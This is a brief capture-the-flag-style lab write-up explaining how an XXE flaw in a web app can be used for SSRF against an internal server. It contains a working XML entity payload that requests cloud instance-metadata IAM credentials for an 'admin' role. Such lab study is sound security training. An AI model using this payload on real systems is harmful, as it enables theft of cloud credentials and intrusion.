## Overview  
The lab has the other server called the lab server, we can use XXE on web app to interact the lab server. That is XXE perform SSRF.  
`<!DOCTYPE xxe [<!ENTITY abc SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>`  
![image](https://user-images.githubusercontent.com/22276823/127725267-fa447cd6-2c26-4957-8662-e36a2bb23259.png)  
